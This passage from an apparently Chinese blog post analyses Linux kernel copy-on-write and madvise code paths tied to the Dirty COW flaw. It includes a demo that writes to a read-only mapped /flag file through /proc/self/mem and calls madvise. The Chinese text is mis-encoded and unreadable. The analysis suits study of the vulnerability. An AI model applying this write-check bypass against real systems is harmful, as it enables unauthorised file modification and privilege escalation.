class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br>		<span class="hljs-type">int</span> dirtied;<br><br>		<span class="hljs-keyword">if</span> (!page_mkwrite)<br>			lock_page(page);<br><br>		dirtied = set_page_dirty(page);<br>		VM_BUG_ON_PAGE(PageAnon(page), page);<br>		mapping = page-&gt;mapping;<br>		unlock_page(page);<br>		put_page(page);<br><br>		<span class="hljs-keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Some device drivers do not set page.mapping</span><br><span class="hljs-comment">			 * but still dirty their pages</span><br><span class="hljs-comment">			 */</span><br>			balance_dirty_pages_ratelimited(mapping);<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!page_mkwrite)<br>			file_update_time(vma-&gt;vm_file);<br>	&#125;<br>    <span class="hljs-keyword">return</span> VM_FAULT_WRITE; <span class="hljs-comment">//è¿”å›è¿™ä¸ªæ ‡å¿—è¡¨ç¤ºè¿›è¡ŒCOWä¹‹åï¼Œè¿™ä¸ªé¡µå¯ä»¥å†™å…¥äº†</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ€å<code>handle_mm_fault()</code>è¿”å›åˆ°<code>faultin_page()</code>ä¸­æ—¶, ç”±äºè¿”å›äº†<strong>VM_FAULT_WRIT</strong>Eæ ‡å¿—, è¡¨ç¤ºå¯ä»¥å†™å…¥, å› æ­¤ä¼šå»æ‰<code>flags</code>ä¸­çš„<strong>FOLL_WRITE</strong>æ ‡å¿—, ä¸å†æ£€æŸ¥å†™å…¥æƒé™</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>		*flags &amp;= ~FOLL_WRITE;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨é“¾å¦‚ä¸‹</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br>	<span class="hljs-built_in">handle_mm_fault</span>()<br>		<span class="hljs-built_in">__handle_mm_fault</span>()<br>			<span class="hljs-built_in">handle_pte_fault</span>()<br>				<span class="hljs-built_in">do_fault</span>()<br>					<span class="hljs-built_in">do_wp_page</span>()<br>						<span class="hljs-built_in">wp_page_reuse</span>()<br>							<span class="hljs-built_in">maybe_mkwrite</span>(pte_mkdirty(entry), vma);<br>                        	  return VM_FAULT_WRITE;<br></code></pre></td></tr></table></figure>

<h4 id="get-user-pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯"><a href="#get-user-pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯" class="headerlink" title="__get_user_pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯"></a>__get_user_pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯</h4><p>ç¬¬ä¸‰æ¬¡è¿›å…¥<code>follow_page_mask()</code>, ç”±äºä¹‹å‰å»æ‰äº†<strong>FOLL_WRITE</strong>æ ‡å¿—, å› æ­¤ä¸ä¼šæ£€æŸ¥<strong>PTE</strong>æœ‰æ²¡æœ‰å†™å…¥æƒé™, ä»è€Œé€šè¿‡<code>follow_page_mask()</code>è¿”å›å¯¹åº”çš„é¡µ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//å¦‚æœè¦æ±‚å†™å…¥ï¼Œä½†æ˜¯pteè¡¨ç¤ºä¸å¯å†™å…¥</span><br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br></code></pre></td></tr></table></figure>

<ul>
<li>ä¹‹åä¼šæ²¿ç€è·¯å¾„è¿”å›: <code>get_user_pages() -&gt;__ get_user_pages_locked() -&gt; get_user_page_remote() -&gt; __access_remote_vm()</code></li>
<li><code>__access_remote_vm()</code>é”å®šé¡µé¢å, å…ˆè°ƒç”¨<code>kmap</code>æŠŠé¡µé¢æ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ä¸­, å†è°ƒç”¨<code>copy_to_user_page()</code>å®Œæˆä»å†…æ ¸ç¼“å†²åŒºåˆ°å¯¹åº”é¡µé¢çš„å†™å…¥</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//æ­¤æ—¶çš„pageä¸ºget_user_pages_remote()ä¸ºç”¨æˆ·å¯»æ‰¾çš„ï¼Œæ˜¯è¢«é”å®šåœ¨å†…å­˜ä¸­çš„é¡µï¼Œkmapå°†å…¶æ˜ å°„åœ¨å†…æ ¸åœ°å€ç©ºé—´ä¸­</span><br>			maddr = kmap(page);<br>			<span class="hljs-keyword">if</span> (write) &#123;	<span class="hljs-comment">//å†™å…¥è¯·æ±‚</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                	å…ˆè°ƒç”¨copy_to_user_page()è¿›è¡Œå†™å…¥</span><br><span class="hljs-comment">                	maddrä¸ºæ ¹æ®addré”å®šçš„é¡µï¼Œoffsetä¸ºaddré¢é¡µå†…åç§»ï¼Œä¸¤è€…ç›¸åŠ å°±æ˜¯è¦å†™å…¥çš„åœ°å€</span><br><span class="hljs-comment">                	ç­‰ä»·ä¸ºï¼šmemcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>				copy_to_user_page(vma, page, addr,<br>						  maddr + offset, buf, bytes);<br></code></pre></td></tr></table></figure>



<h2 id="madviseã®ä½¿ç”¨æ–¹æ³•"><a href="#madviseã®ä½¿ç”¨æ–¹æ³•" class="headerlink" title="madviseã®ä½¿ç”¨æ–¹æ³•"></a>madviseã®ä½¿ç”¨æ–¹æ³•</h2><p><code>madvise()</code>ç³»ç»Ÿæ‰ç”¨ï¼Œç”¨äºå‘å†…æ ¸æä¾›å¯¹äºèµ·å§‹åœ°å€ä¸º<code>addr</code>ï¼Œé•¿åº¦ä¸º<code>length</code>çš„å†…å­˜ç©ºé—´çš„æ“ä½œå»ºè®®æˆ–è€…æŒ‡ç¤ºã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ­¤ç±»å»ºè®®çš„ç›®æ ‡æ˜¯æé«˜ç³»ç»Ÿæˆ–è€…åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</p>
<h4 id="æµ‹è¯•demo-1"><a href="#æµ‹è¯•demo-1" class="headerlink" title="æµ‹è¯•demo"></a>æµ‹è¯•demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, (<span class="hljs-type">char</span> *)mem);<br><br>    madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="sys-madvise"><a href="#sys-madvise" class="headerlink" title="sys_madvise()"></a>sys_madvise()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The madvise(2) system call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Applications can use madvise() to advise the kernel how it should</span><br><span class="hljs-comment"> * handle paging I/O in this VM area.  The idea is to help the kernel</span><br><span class="hljs-comment"> * use appropriate read-ahead and caching techniques.  The information</span><br><span class="hljs-comment"> * provided is advisory only, and can be safely disregarded by the</span><br><span class="hljs-comment"> * kernel without affecting the correct operation of the application.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * behavior values:</span><br><span class="hljs-comment"> *  MADV_NORMAL - the default behavior is to read clusters.  This</span><br><span class="hljs-comment"> *		results in some read-ahead and read-behind.</span><br><span class="hljs-comment"> *  MADV_RANDOM - the system should read the minimum amount of data</span><br><span class="hljs-comment"> *		on any access, since it is unlikely that the appli-</span><br><span class="hljs-comment"> *		cation will need more than what it asks for.</span><br><span class="hljs-comment"> *  MADV_SEQUENTIAL - pages in the given range will probably be accessed</span><br><span class="hljs-comment"> *		once, so they can be aggressively read ahead, and</span><br><span class="hljs-comment"> *		can be freed soon after they are accessed.</span><br><span class="hljs-comment"> *  MADV_WILLNEED - the application is notifying the system to read</span><br><span class="hljs-comment"> *		some pages ahead.</span><br><span class="hljs-comment"> *  MADV_DONTNEED - the application is finished with the given range,</span><br><span class="hljs-comment"> *		so the kernel can free resources associated with it.</span><br><span class="hljs-comment"> *  MADV_FREE - the application marks pages in the given range as lazy free,</span><br><span class="hljs-comment"> *		where actual purges are postponed until memory pressure happens.</span><br><span class="hljs-comment"> *  MADV_REMOVE - the application wants to free up the given range of</span><br><span class="hljs-comment"> *		pages and associated backing store.</span><br><span class="hljs-comment"> *  MADV_DONTFORK - omit this area from child&#x27;s address space when forking:</span><br><span class="hljs-comment"> *		typically, to avoid COWing pages pinned by get_user_pages().</span><br><span class="hljs-comment"> *  MADV_DOFORK - cancel MADV_DONTFORK: no longer omit this area when forking.</span><br><span class="hljs-comment"> *  MADV_HWPOISON - trigger memory error handler as if the given memory range</span><br><span class="hljs-comment"> *		were corrupted by unrecoverable hardware memory failure.</span><br><span class="hljs-comment"> *  MADV_SOFT_OFFLINE - try to soft-offline the given range of memory.</span><br><span class="hljs-comment"> *  MADV_MERGEABLE - the application recommends that KSM try to merge pages in</span><br><span class="hljs-comment"> *		this area with pages of identical content from other such areas.</span><br><span class="hljs-comment"> *  MADV_UNMERGEABLE- cancel MADV_MERGEABLE: no longer merge pages with others.</span><br><span class="hljs-comment"> *  MADV_HUGEPAGE - the application wants to back the given range by transparent</span><br><span class="hljs-comment"> *		huge pages in the future. Existing pages might be coalesced and</span><br><span class="hljs-comment"> *		new pages might be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_NOHUGEPAGE - mark the given range as not worth being backed by</span><br><span class="hljs-comment"> *		transparent huge pages so the existing pages will not be</span><br><span class="hljs-comment"> *		coalesced into THP and new pages will not be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_DONTDUMP - the application wants to prevent pages in the given range</span><br><span class="hljs-comment"> *		from being included in its core dump.</span><br><span class="hljs-comment"> *  MADV_DODUMP - cancel MADV_DONTDUMP: no longer exclude from core dump.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * return values:</span><br><span class="hljs-comment"> *  zero    - success</span><br><span class="hljs-comment"> *  -EINVAL - start + len &lt; 0, start is not page-aligned,</span><br><span class="hljs-comment"> *		&quot;behavior&quot; is not a valid value, or application</span><br><span class="hljs-comment"> *		is attempting to release locked or shared pages.</span><br><span class="hljs-comment"> *  -ENOMEM - addresses in the specified range are not currently</span><br><span class="hljs-comment"> *		mapped, or are outside the AS of the process.</span><br><span class="hljs-comment"> *  -EIO    - an I/O error occurred while paging in data.</span><br><span class="hljs-comment"> *  -EBADF  - map exists, but area maps something that isn&#x27;t a file.</span><br><span class="hljs-comment"> *  -EAGAIN - a kernel resource was temporarily unavailable.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	è¿›ç¨‹å¯ä»¥ä½¿ç”¨madvise()æ¥å»ºè®®å†…æ ¸æ€ä¹ˆå¤„ç†ç›¸å…³å†…å­˜åŒºåŸŸ</span><br><span class="hljs-comment">	@start: å†…å­˜èµ·å§‹åœ°å€</span><br><span class="hljs-comment">	@len_in: é•¿åº¦</span><br><span class="hljs-comment">	@behavior: å»ºè®®</span><br><span class="hljs-comment">*/</span><br>SYSCALL_DEFINE3(madvise, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, start, <span class="hljs-type">size_t</span>, len_in, <span class="hljs-type">int</span>, behavior)<br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, tmp;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>, *<span class="hljs-title">prev</span>;</span><br>	<span class="hljs-type">int</span> unmapped_error = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> error = -EINVAL;<br>	<span class="hljs-type">int</span> write;<br>	<span class="hljs-type">size_t</span> len;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">blk_plug</span> <span class="hljs-title">plug</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span><br>	<span class="hljs-keyword">if</span> (behavior == MADV_HWPOISON || behavior == MADV_SOFT_OFFLINE)<br>		<span class="hljs-keyword">return</span> madvise_hwpoison(behavior, start, start+len_in);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//æ£€æŸ¥ä¸€ä¸‹behavioræ˜¯å¦æœ‰æ•ˆ</span><br>	<span class="hljs-keyword">if</span> (!madvise_behavior_valid(behavior))<br>		<span class="hljs-keyword">return</span> error;<br>	<span class="hljs-comment">//è¦æ±‚èµ·å§‹åœ°å€ä¸é¡µå¯¹é½</span><br>	<span class="hljs-keyword">if</span> (start &amp; ~PAGE_MASK)<br>		<span class="hljs-keyword">return</span> error;<br>    <span class="hljs-comment">//lenå‘ä¸Šå…³äºé¡µå¯¹é½</span><br>	len = (len_in + ~PAGE_MASK) &amp; PAGE_MASK;<br><br>	<span class="hljs-comment">/* Check to see whether len was rounded up from small -ve to zero */</span><br>    <span class="hljs-comment">//lenæº¢å‡º</span><br>	<span class="hljs-keyword">if</span> (len_in &amp;&amp; !len)<br>		<span class="hljs-keyword">return</span> error;<br>	<span class="hljs-comment">//ç»“æŸåœ°å€</span><br>	end = start + len;<br>	<span class="hljs-keyword">if</span> (end &lt; start)<br>		<span class="hljs-keyword">return</span> error;<br><br>	error = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (end == start)<br>		<span class="hljs-keyword">return</span> error;<br>	<span class="hljs-comment">//åˆ¤æ–­ä¸‹è¿™ä¸ªè¡Œä¸ºæ˜¯å¦éœ€è¦å†™å…¥mmapï¼Œå¹¶è·å–ç›¸å…³ä¿¡å·é‡</span><br>	write = madvise_need_mmap_write(behavior);<br>	<span class="hljs-keyword">if</span> (write) &#123;<br>		<span class="hljs-keyword">if</span> (down_write_killable(&amp;current-&gt;mm-&gt;mmap_sem))<br>			<span class="hljs-keyword">return</span> -EINTR;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		down_read(&amp;current-&gt;mm-&gt;mmap_sem);<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If the interval [start,end) covers some unmapped address</span><br><span class="hljs-comment">	 * ranges, just ignore them, but return -ENOMEM at the end.</span><br><span class="hljs-comment">	 * - different from the way of handling in mlock etc.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//æ‰¾åˆ°startå¯¹åº”çš„VMAå¯¹è±¡</span><br>	vma = find_vma_prev(current-&gt;mm, start, &amp;prev);<br>	<span class="hljs-keyword">if</span> (vma &amp;&amp; start &gt; vma-&gt;vm_start)<br>		prev = vma;<br><br>	blk_start_plug(&amp;plug);<br>	<span class="hljs-keyword">for</span> (;;) &#123;<span class="hljs-comment">//éå†æ‰€æœ‰ç›¸å…³çš„VMA</span><br>		<span class="hljs-comment">/* Still start &lt; end. */</span><br>		error = -ENOMEM;<br>		<span class="hljs-keyword">if</span> (!vma)<br>			<span class="hljs-keyword">goto</span> out;<br><br>		<span class="hljs-comment">/* Here start &lt; (end|vma-&gt;vm_end). */</span><br>		<span class="hljs-keyword">if</span> (start &lt; vma-&gt;vm_start) &#123;<br>			unmapped_error = -ENOMEM;<br>			start = vma-&gt;vm_start;<br>			<span class="hljs-keyword">if</span> (start &gt;= end)	<span class="hljs-comment">//startæ²¡æœ‰å¯¹åº”çš„VMA</span><br>				<span class="hljs-keyword">goto</span> out;<br>		&#125;<br><br>		<span class="hljs-comment">/*tmpä¸ºæœ¬æ¬¡å»ºè®®çš„ç»“æŸåœ°å€ Here vma-&gt;vm_start &lt;= start &lt; (end|vma-&gt;vm_end) */</span><br>        <br>		tmp = vma-&gt;vm_end;<br>		<span class="hljs-keyword">if</span> (end &lt; tmp)<br>			tmp = end;<br><br>		<span class="hljs-comment">/*è¿›è¡Œå»ºè®® Here vma-&gt;vm_start &lt;= start &lt; tmp &lt;= (end|vma-&gt;vm_end). */</span><br>		error = madvise_vma(vma, &amp;prev, start, tmp, behavior);<br>		<span class="hljs-keyword">if</span> (error)<br>			<span class="hljs-keyword">goto</span> out;<br>		start = tmp;	<span class="hljs-comment">//ä¸‹ä¸€æ¬¡å¾ªç¯çš„èµ·å§‹åœ°å€</span><br>		<span class="hljs-keyword">if</span> (prev &amp;&amp; start &lt; prev-&gt;vm_end)<br>			start = prev-&gt;vm_end;<br>		error = unmapped_error;<br>		<span class="hljs-keyword">if</span> (start &gt;= end)	<span class="hljs-comment">//ç»“æŸ</span><br>			<span class="hljs-keyword">goto</span> out;<br>        <span class="hljs-comment">//é‡æ–°å¯»æ‰¾å¯¹åº”çš„VMA</span><br>		<span class="hljs-keyword">if</span> (prev)<br>			vma = prev-&gt;vm_next;<br>		<span class="hljs-keyword">else</span>	<span class="hljs-comment">/* madvise_remove dropped mmap_sem */</span><br>			vma = find_vma(current-&gt;mm, start);<br>	&#125;<br>out:<br>	blk_finish_plug(&amp;plug);<br>	<span class="hljs-keyword">if</span> (write)<br>		up_write(&amp;current-&gt;mm-&gt;mmap_sem);<br>	<span class="hljs-keyword">else</span><br>		up_read(&amp;current-&gt;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="madvise-vma"><a href="#madvise-vma" class="headerlink" title="madvise_vma()"></a>madvise_vma()</h4><p><code>madvice_vma()</code>æ ¹æ®<code>behavior</code>æŠŠè¯·æ±‚åˆ†é…åˆ°å¯¹åº”å¤„ç†å‡½æ•°, å¯¹äº<strong>MADV_DONTNEE</strong>Dä¼šè°ƒç”¨<code>madvise_dontneed()</code>å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">madvise_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, <span class="hljs-type">int</span> behavior)</span><br>&#123;<br>	<span class="hljs-keyword">switch</span> (behavior) &#123;<br>	<span class="hljs-keyword">case</span> MADV_REMOVE:<br>		<span class="hljs-keyword">return</span> madvise_remove(vma, prev, start, end);<br>	<span class="hljs-keyword">case</span> MADV_WILLNEED:<br>		<span class="hljs-keyword">return</span> madvise_willneed(vma, prev, start, end);<br>	<span class="hljs-keyword">case</span> MADV_FREE:<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * <span class="hljs-doctag">XXX:</span> In this implementation, MADV_FREE works like</span><br><span class="hljs-comment">		 * MADV_DONTNEED on swapless system or full swap.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (get_nr_swap_pages() &gt; <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">return</span> madvise_free(vma, prev, start, end);<br>		<span class="hljs-comment">/* passthrough */</span><br>	<span class="hljs-keyword">case</span> MADV_DONTNEED:<br>		<span class="hljs-keyword">return</span> madvise_dontneed(vma, prev, start, end);<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">return</span> madvise_behavior(vma, prev, start, end, behavior);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="madvise-dontneed"><a href="#madvise-dontneed" class="headerlink" title="madvise_dontneed()"></a>madvise_dontneed()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Application no longer needs these pages.  If the pages are dirty,</span><br><span class="hljs-comment"> * it&#x27;s OK to just throw them away.  The app will be more careful about</span><br><span class="hljs-comment"> * data it wants to keep.  Be sure to free swap resources too.  The</span><br><span class="hljs-comment"> * zap_page_range call sets things up for shrink_active_list to actually free</span><br><span class="hljs-comment"> * these pages later if no one else has touched them in the meantime,</span><br><span class="hljs-comment"> * although we could add these pages to a global reuse list for</span><br><span class="hljs-comment"> * shrink_active_list to pick up before reclaiming other pages.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NB: This interface discards data rather than pushes it out to swap,</span><br><span class="hljs-comment"> * as some implementations do.  This has performance implications for</span><br><span class="hljs-comment"> * applications like large transactional databases which want to discard</span><br><span class="hljs-comment"> * pages in anonymous maps after committing to backing store the data</span><br><span class="hljs-comment"> * that was kept in them.  There is no reason to write this data out to</span><br><span class="hljs-comment"> * the swap area if the application is discarding it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * An interface that causes the system to free clean pages and flush</span><br><span class="hljs-comment"> * dirty pages is already available as msync(MS_INVALIDATE).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	åº”ç”¨è¡¨ç¤ºä¸éœ€è¦è¿™äº›é¡µï¼Œå³ä½¿è¿™äº›é¡µæ˜¯è„é¡µï¼Œä¹Ÿç›´æ¥ä¸¢å¼ƒï¼Œå› æ­¤åº”ç”¨åœ¨ä¸¢å¼ƒå‰å¿…é¡»è‡ªå·±ä¿å­˜å¥½æ•°æ®</span><br><span class="hljs-comment">	